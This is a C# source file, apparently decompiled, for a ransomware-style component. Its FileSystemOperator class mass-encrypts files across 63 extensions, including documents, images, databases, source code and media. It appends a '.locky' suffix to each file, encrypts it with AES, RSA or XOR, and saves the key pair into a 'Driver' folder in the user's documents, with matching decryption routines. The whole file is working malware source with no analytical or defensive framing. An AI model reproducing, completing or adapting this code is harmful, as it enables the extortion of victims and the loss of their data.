using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;

namespace Leen;

internal class FileSystemOperator
{
	public void WriteLog(string logMessage)
	{
		Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
			Directory.CreateDirectory(folderPath + "\\Driver");
			folderPath += "\\Driver";
			using StreamWriter txtWriter = File.AppendText(folderPath + "\\KKK.print");
			Log(logMessage, txtWriter);
		}
		catch (Exception)
		{
			Console.WriteLine("failed to log :/");
		}
	}

	public void LogKeyData(string privatekey, string publickey)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		Directory.CreateDirectory(folderPath + "\\Driver");
		folderPath += "\\Driver";
		string text = folderPath + "\\K.print";
		Console.WriteLine(text);
		FileStream stream = File.Create(text);
		using StreamWriter streamWriter = new StreamWriter(stream);
		streamWriter.Write(privatekey + "," + publickey);
	}

	public void Log(string logMessage, TextWriter txtWriter)
	{
		try
		{
			logMessage = DateTime.Now.ToLongTimeString() + " : " + logMessage;
			txtWriter.WriteLine(logMessage);
		}
		catch (Exception)
		{
		}
	}

	public void startstopFileDump()
	{
	}

	public FileInfo[] GetLockyFileCount(string path)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(path);
		return directoryInfo.GetFiles("*.locky");
	}

	public FileInfo[] GetTXTFileCount(string path)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(path);
		return directoryInfo.GetFiles("*.txt");
	}

	public void LockTXTFile(FileInfo file)
	{
		EncryptionOperation encryptionOperation = new EncryptionOperation();
		Console.WriteLine("鎖定中");
		_ = file.Name;
		file.Name.Replace(".txt", ".locky");
		_ = file.Extension;
		string text = file.FullName.Replace(".txt", ".locky");
		File.Move(file.FullName, text);
		encryptionOperation.EncryptFileAES(text);
	}

	public int[] LockTXTFiles(FileSystemOperator fileSystemOperator, string path, string method, int stage)
	{
		int[] array = new int[2];
		int num = 0;
		int num2 = 0;
		try
		{
			DirectoryInfo d = new DirectoryInfo(path);
			string[] source = new string[63]
			{
				"*.gif", "*.jpg", "*.txt", "*.png", "*.xlsx", "*.ppt", "*.html", "*.pdf", "*.xls", "*.doc",
				"*.docx", "*.pptx", "*.aam", "*.abf", "*.adb", "*.adi", "*.afm", "*.ai", "*.all", "*.anc",
				"*.aps", "*.ari", "*.art", "*.asc", "*.ase", "*.asm", "*.asp", "*.avi", "*.bak", "*.bat",
				"*.c", "*.cad", "*.cap", "*.ccb", "*.cda", "*.cdf", "*.class", "*.clss", "*.com", "*.cpp",
				"*.crt", "*.csv", "*.db", "*.go", "*.ini", "*.jpeg", "*.java", "*.jar", "*.js", "*.mpeg",
				"*.mp4", "*.wav", "*.mp3", "*.py", "*.pot", "*.prn", "*.ra", "*.rtf", "*.vbs", "*.vbp",
				"*.vba", "*.wps", "*.mov"
			};
			IEnumerable<FileInfo> enumerable = source.SelectMany((string ext) => d.GetFiles(ext));
			EncryptionOperation encryptionOperation = new EncryptionOperation();
			foreach (FileInfo item in enumerable)
			{
				fileSystemOperator.WriteLog("[LockTXTFiles]" + item.FullName);
				_ = item.Name;
				_ = item.Name + ".locky";
				_ = item.Extension;
				string text = item.FullName + ".locky";
				try
				{
					File.Move(item.FullName, text);
					switch (method)
					{
					case "RSA":
						encryptionOperation.EncryptFileRSA(text);
						break;
					case "AES":
						encryptionOperation.EncryptFileAES(text);
						num++;
						break;
					case "XOR":
						encryptionOperation.EncryptFileXOR(text);
						num++;
						break;
					}
				}
				catch (Exception ex)
				{
					fileSystemOperator.WriteLog("[LockTXTFiles] Error " + item.FullName + " error=" + ex.Message);
					num2++;
				}
			}
		}
		catch (Exception ex2)
		{
			fileSystemOperator.WriteLog("[LockTXTFiles] Error  error=" + ex2.Message);
			num2++;
		}
		array[0] = num;
		array[1] = num2;
		return array;
	}

	public void UnlockLockyFile(FileInfo file)
	{
		EncryptionOperation encryptionOperation = new EncryptionOperation();
		file.Name.Replace(".locky", ".txt");
		string text = file.FullName.Replace(".locky", ".txt");
		try
		{
			File.Move(file.FullName, text);
			encryptionOperation.DecryptFileAES(text);
		}
		catch
		{
		}
	}

	public int[] UnlockLockyFiles(FileSystemOperator fileSystemOperator, string path, string method)
	{
		int[] array = new int[2];
		int num = 0;
		int num2 = 0;
		DirectoryInfo directoryInfo = new DirectoryInfo(path);
		try
		{
			FileInfo[] files = directoryInfo.GetFiles("*.locky");
			if (files.Length != 0)
			{
				EncryptionOperation encryptionOperation = new EncryptionOperation();
				FileInfo[] array2 = files;
				foreach (FileInfo fileInfo in array2)
				{
					fileInfo.Name.Replace(".locky", "");
					string text = fileInfo.FullName.Replace(".locky", "");
					switch (method)
					{
					case "RSA":
						encryptionOperation.DecryptFileRSA(text);
						break;
					case "AES":
						Console.WriteLine(text);
						try
						{
							encryptionOperation.DecryptFileAES(fileInfo.FullName);
							File.Move(fileInfo.FullName, text);
							Console.WriteLine(fileInfo.FullName + "解密成功");
							num++;
						}
						catch (Exception ex2)
						{
							Console.WriteLine(fileInfo.FullName + "解密失敗 error=" + ex2.Message);
							fileSystemOperator.WriteLog("[UnlockLockyFiles] Error " + fileInfo.FullName + " Decrypt Failed error=" + ex2.Message);
							num2++;
						}
						break;
					case "XOR":
						Console.WriteLine(text);
						try
						{
							encryptionOperation.DecryptFileXOR(fileInfo.FullName);
							File.Move(fileInfo.FullName, text);
							Console.WriteLine(fileInfo.FullName + "解密成功");
							num++;
						}
						catch (Exception ex)
						{
							Console.WriteLine(fileInfo.FullName + "解密失敗 error=" + ex.Message);
							fileSystemOperator.WriteLog("[UnlockLockyFiles] Error " + fileInfo.FullName + " Decrypt Failed error=" + ex.Message);
							num2++;
						}
						break;
					}
				}
			}
		}
		catch (Exception ex3)
		{
			Console.WriteLine("[UnlockLockyFiles] Error error=" + ex3.Message);
			fileSystemOperator.WriteLog("[UnlockLockyFiles] Error error=" + ex3.Message);
			num2++;
		}
		array[0] = num;
		array[1] = num2;
		return array;
	}
}
